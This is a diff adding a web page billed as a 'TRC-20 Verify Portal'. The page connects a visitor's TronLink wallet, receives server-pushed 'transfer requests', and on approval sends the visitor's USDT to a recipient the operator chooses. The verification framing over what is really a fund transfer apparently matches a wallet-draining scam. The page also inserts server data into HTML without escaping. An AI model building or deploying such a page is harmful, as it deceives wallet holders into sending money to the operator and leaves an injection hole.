@@ -1,0 +1,118 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>TRC-20 Verify Portal</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+body{font-family:Arial,sans-serif;margin:0;padding:0;background:#f4f6f8;color:#333;}
+.navbar{background:#2e64e6;color:white;padding:15px;text-align:center;font-size:20px;font-weight:bold;}
+.container{max-width:800px;margin:20px auto;padding:0 15px;}
+.card{background:white;padding:15px;margin:15px 0;border-radius:10px;box-shadow:0 2px 5px rgba(0,0,0,0.1);}
+button{padding:10px 14px;margin-top:10px;border:none;border-radius:8px;background:#2e64e6;color:white;cursor:pointer;}
+button:hover{background:#254eb8;}
+.footer{text-align:center;color:#666;font-size:0.85em;margin:30px 0;}
+</style>
+</head>
+<body>
+<div class="navbar">MyTRC20 Company</div>
+<div class="container">
+  <div class="card">
+    <div><strong>Connected Wallet:</strong> <span id="addr">Not connected</span></div>
+    <div><strong>Status:</strong> <span id="status">—</span></div>
+    <button id="connectBtn">Connect Wallet</button>
+  </div>
+
+  <div class="card">
+    <h3>Pending Requests</h3>
+    <div id="requestsList">No pending requests</div>
+  </div>
+</div>
+<div class="footer">
+&copy; 2025 MyTRC20 Company. All rights reserved. | <a href="#">Privacy Policy</a>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
+<script>
+const BACKEND_BASE = window.location.origin;
+const WS_URL = (BACKEND_BASE.replace(/^http/,'ws'))+'/';
+const DECIMALS=6;
+const USDT_CONTRACT='REPLACE_WITH_TEST_USDT_CONTRACT';
+let tronWebInstance=null;
+let userAddress=null;
+let ws=null;
+let requests={};
+
+document.getElementById('connectBtn').addEventListener('click',connectWallet);
+
+async function connectWallet(){
+  if(window.tronWeb && window.tronWeb.defaultAddress.base58){
+    tronWebInstance=window.tronWeb;
+    userAddress=tronWebInstance.defaultAddress.base58;
+    document.getElementById('addr').innerText=userAddress;
+    document.getElementById('status').innerText='Wallet connected';
+    connectWS();
+  }else{alert('Open with TronLink or Trust Wallet');}
+}
+
+function connectWS(){
+  ws=new WebSocket(WS_URL);
+  ws.onmessage=ev=>{
+    try{
+      const p=JSON.parse(ev.data);
+      if(p.type==='transfer_request') handleTransferRequest(p.data);
+    }catch(e){console.error(e);}
+  };
+}
+
+function renderRequests(){
+  const container=document.getElementById('requestsList');
+  const keys=Object.keys(requests);
+  if(keys.length===0){container.innerText='No pending requests';return;}
+  container.innerHTML='';
+  keys.forEach(k=>{
+    const r=requests[k];
+    const el=document.createElement('div');
+    el.style.borderTop='1px solid #eee';el.style.padding='8px 0';
+    el.innerHTML=`<strong>ID:</strong>${r.id}<br>
+      <strong>Amount:</strong>${r.amount} USDT<br>
+      <strong>Recipient:</strong>${r.recipient}<br>
+      <strong>Status:</strong>${r.status||'requested'}<br>
+      <button data-id="${r.id}" class="approveBtn">Approve & Transfer</button>`;
+    container.appendChild(el);
+  });
+  document.querySelectorAll('.approveBtn').forEach(b=>{
+    b.addEventListener('click',()=>runTransferForRequest(b.getAttribute('data-id')));
+  });
+}
+
+function handleTransferRequest(data){
+  if(!userAddress) return;
+  if(data.userAddress.toLowerCase()!==userAddress.toLowerCase()) return;
+  requests[data.id]={...data,status:'requested'};
+  renderRequests();
+}
+
+async function runTransferForRequest(id){
+  const req=requests[id];
+  if(!req)return alert('Request not found');
+  if(!confirm(`Admin requests ${req.amount} USDT to ${req.recipient}. Proceed?`)) return;
+  try{
+    const contract=await tronWebInstance.contract().at(USDT_CONTRACT);
+    const rawAmount=BigInt(Math.floor(Number(req.amount)*(10**DECIMALS))).toString();
+    requests[id].status='signing'; renderRequests();
+    const result=await contract.transfer(req.recipient,rawAmount).send({feeLimit:1_000_000_000});
+    let txHash=result?.txID || result?.txid || result || null;
+    if(!txHash){requests[id].status='failed';renderRequests();alert('Tx failed');return;}
+    await fetch(`${BACKEND_BASE}/request/${encodeURIComponent(id)}/tx`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({txHash})
+    });
+    requests[id].status='pending'; renderRequests();
+    alert('Transaction sent: '+txHash);
+  }catch(e){console.error(e); requests[id].status='failed';renderRequests();alert('Transaction failed');}
+}
+</script>
+</body>
+</html>
